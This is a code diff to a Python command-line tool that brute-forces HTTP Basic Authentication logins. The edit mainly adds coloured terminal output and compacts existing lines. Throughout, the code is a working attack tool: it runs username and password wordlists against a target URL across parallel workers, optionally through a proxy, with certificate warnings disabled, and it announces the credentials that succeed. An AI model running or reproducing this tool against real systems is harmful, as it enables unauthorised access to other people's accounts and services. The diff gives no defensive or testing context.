@@ -6,9 +6,11 @@ import argparse
 import sys
 import os
 import urllib3
+from colorama import init, Fore, Style
 
+# Initialize colorama
+init(autoreset=True)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
 
 def safe_lines(filepath):
     warned = False
@@ -19,25 +21,19 @@ def safe_lines(filepath):
                 if not line:
                     continue
                 try:
-                    line.encode('latin1')  # Required by HTTP Basic Auth
+                    line.encode('latin1')
                     yield line
                 except UnicodeEncodeError:
                     if not warned:
-                        print(f"[!] Skipping unsupported lines in '{filepath}' (non-latin1). Modifying stream silently...")
+                        print(Fore.YELLOW + f"[!] Skipping unsupported lines in '{filepath}' (non-latin1).")
                         warned = True
-                    continue
     except FileNotFoundError:
-        print(f"[!] File Not Found: {filepath}")
+        print(Fore.RED + f"[!] File Not Found: {filepath}")
         sys.exit(1)
-
 
 def create_session(proxy=None):
     session = requests.Session()
-    retries = Retry(
-        total=3,
-        backoff_factor=1,
-        status_forcelist=[500, 502, 503, 504]
-    )
+    retries = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
     adapter = HTTPAdapter(max_retries=retries)
     session.mount("http://", adapter)
     session.mount("https://", adapter)
@@ -46,29 +42,22 @@ def create_session(proxy=None):
         session.proxies = {"http": proxy, "https": proxy}
     return session
 
-
 def update_progress(current, total):
     bar_len = 40
     filled_len = int(bar_len * current / total)
-    bar = '■' * filled_len + '□' * (bar_len - filled_len)
+    bar = '■' * filled_len + '·' * (bar_len - filled_len)
     percent = (current / total) * 100
-    print(f"\r[+] Progress: [{bar}] {percent:5.1f}%  →  ({current}/{total})", end='', flush=True)
-
+    print(Fore.CYAN + f"\r[+] Progress: [{bar}] {percent:5.1f}%  →  ({current}/{total})", end='', flush=True)
 
 def try_login(domain, username, password, proxy, shared, lock):
     if shared['found']:
         return
-
     session = create_session(proxy)
 
     try:
-        response = session.get(
-            domain,
-            auth=HTTPBasicAuth(username, password),
-            timeout=5,
-        )
+        response = session.get(domain, auth=HTTPBasicAuth(username, password), timeout=5)
     except requests.RequestException as e:
-        print(f"\n[!] ERROR: {username}:{password} → {e}")
+        print(Fore.RED + f"\n[!] ERROR: {username}:{password} → {e}")
         return
 
     with lock:
@@ -76,26 +65,21 @@ def try_login(domain, username, password, proxy, shared, lock):
         update_progress(shared['count'], shared['total'])
 
         if response.status_code == 200 and not shared['found']:
-            print(f"\n[✓] SUCCESS: {username}:{password}")
+            print(Fore.GREEN + f"\n[✓] SUCCESS: {username}:{password}")
             shared['found'] = True
         elif response.status_code == 401:
             pass
         else:
-            print(f"\n[?] UNKNOWN: {username}:{password} → Status: {response.status_code}")
-
+            print(Fore.YELLOW + f"\n[?] UNKNOWN: {username}:{password} → Status: {response.status_code}")
 
 def brute_force(domain, usernames, passfile, proxy, workers):
-    print(f"[+] Target: {domain}")
-    print(f"[+] Proxy: {proxy}" if proxy else "[+] No proxy")
-    print(f"[*] Using {workers} Workers")
+    print(Fore.BLUE + f"[+] Target: {domain}")
+    print(Fore.BLUE + f"[+] Proxy: {proxy}" if proxy else Fore.BLUE + "[+] No proxy")
+    print(Fore.BLUE + f"[*] Using {workers} Workers")
 
     manager = Manager()
-    shared = manager.dict()
-    shared['found'] = False
-    shared['count'] = 0
-    shared['total'] = 0
+    shared = manager.dict(found=False, count=0, total=0)
     lock = manager.Lock()
-
     tasks = []
 
     for username in usernames:
@@ -106,33 +90,29 @@ def brute_force(domain, usernames, passfile, proxy, workers):
     with Pool(processes=workers) as pool:
         pool.starmap(try_login, tasks)
 
-    print("\n[*] Brute-force finished.")
-
+    print(Fore.GREEN + "\n[*] Brute-force finished.")
 
 def resolve_protocol(domain, username, password, proxy):
-    """Auto-switch to HTTPS if redirected, or fallback to HTTP on 401."""
-    http_domain = domain.replace("https://", "http://").replace("http://", "http://")
+    http_domain = domain.replace("https://", "http://")
     https_domain = domain.replace("http://", "https://")
-
     session = create_session(proxy)
 
     try:
         response = session.get(http_domain, allow_redirects=True, auth=HTTPBasicAuth(username, password), timeout=5)
         if response.url.startswith("https://"):
-            print(f"[+] Auto-redirect detected: using HTTPS")
+            print(Fore.CYAN + "[+] Auto-redirect detected: using HTTPS")
             return https_domain
         elif response.status_code == 401:
-            print(f"[!] 401 Unauthorized on HTTPS, reverting to HTTP")
+            print(Fore.YELLOW + "[!] 401 Unauthorized on HTTPS, reverting to HTTP")
             return http_domain
         else:
             return http_domain
     except Exception as e:
-        print(f"[!] Error testing redirection: {e}")
+        print(Fore.RED + f"[!] Error testing redirection: {e}")
         return domain
 
-
 def main():
-    parser = argparse.ArgumentParser(description="Multiprocessing Basic Auth Brute-Forcer with Progress Bar")
+    parser = argparse.ArgumentParser(description="Multiprocessing Basic Auth Brute-Forcer with Progress Bar and Colors")
     parser.add_argument("-d", "--domain", required=True, help="Target URL (HTTP or HTTPS)")
     parser.add_argument("-U", "--userfile", help="Username wordlist file")
     parser.add_argument("-u", "--username", help="Single username")
@@ -143,21 +123,18 @@ def main():
     args = parser.parse_args()
 
     if not args.username and not args.userfile:
-        print("[!] Provide either -u or -U")
+        print(Fore.RED + "[!] Provide either -u or -U")
         parser.print_help()
         sys.exit(1)
 
     if not os.path.isfile(args.passfile):
-        print(f"[!] Invalid password file path: {args.passfile}")
+        print(Fore.RED + f"[!] Invalid password file path: {args.passfile}")
         sys.exit(1)
 
     usernames = [args.username] if args.username else list(safe_lines(args.userfile))
 
-    # Use first username/password to determine protocol
     domain = resolve_protocol(args.domain, usernames[0], next(safe_lines(args.passfile)), args.proxy)
-
     brute_force(domain, usernames, args.passfile, args.proxy, args.workers)
-
 
 if __name__ == "__main__":
     main()
